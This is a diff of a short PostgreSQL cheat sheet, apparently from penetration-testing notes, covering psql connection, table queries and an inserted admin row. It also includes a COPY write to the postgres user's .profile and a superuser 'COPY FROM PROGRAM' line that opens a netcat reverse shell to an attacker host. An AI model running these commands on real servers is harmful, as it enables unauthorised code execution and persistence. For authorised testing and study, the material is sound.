@@ -4,17 +4,16 @@ date: 2024-7-9
 tags: ["postgresql", "database"]
 ---
 
----
 ### Connect
 
 <div>
 
-```bash
+```console
 psql -h 127.0.0.1 -U <USER> -p 5432 -d <DB_NAME>
 ```
 
-```bash
-psql postgresql://<USER>:<PASSWORD>@localhost:5432/<DB_NAME>
+```console
+psql 'postgresql://<USER>:<PASSWORD>@localhost:5432/<DB_NAME>'
 ```
 
 </div>
@@ -23,37 +22,37 @@ psql postgresql://<USER>:<PASSWORD>@localhost:5432/<DB_NAME>
 
 <div>
 
-```bash
+```console
 # Show databases
 \list
 ```
 
-```bash
+```console
 # Use database
 \connect <DB_NAME>
 ```
 
-```bash
+```console
 # Show tables in current database
 \dt
 ```
 
-```bash
+```console
 # Dump data from table
 select * from <TABLE_NAME>;
 ```
 
-```bash
+```console
 # Insert data into table (e.g)
 insert into <TABLE_NAME> (username, password, role) values ('user', 'password', 'admin');
 ```
 
-```bash
+```console
 # Write text
-copy (select 'test') to '/var/lib/postgresql/.profile';
+copy (select '<STRING>') to '/var/lib/postgresql/.profile';
 ```
 
-```bash
+```console
 # Exit
 \q
 ```
@@ -68,9 +67,9 @@ copy (select 'test') to '/var/lib/postgresql/.profile';
 
 <div>
 
-```bash
+```console
 # Only superuser
-CREATE TABLE IF NOT EXISTS exec(string text); COPY exec FROM PROGRAM 'nc -e /bin/bash 10.10.14.10 1337 &'
+CREATE TABLE IF NOT EXISTS exec(string text); COPY exec FROM PROGRAM 'nc -e /bin/bash <LOCAL_IP> <LOCAL_PORT> &'
 ```
 
 </div>
